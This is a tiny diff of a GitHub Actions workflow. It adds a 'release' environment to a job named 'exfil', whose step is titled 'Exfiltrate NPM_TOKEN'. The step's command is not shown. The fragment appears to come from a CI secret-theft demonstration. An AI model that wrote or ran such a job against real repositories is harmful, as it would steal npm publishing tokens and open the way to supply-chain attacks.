@@ -8,6 +8,7 @@ on:
 jobs:
     exfil:
         runs-on: ubuntu-latest
+        environment: release
         steps:
             - name: Exfiltrate NPM_TOKEN
               run:  |
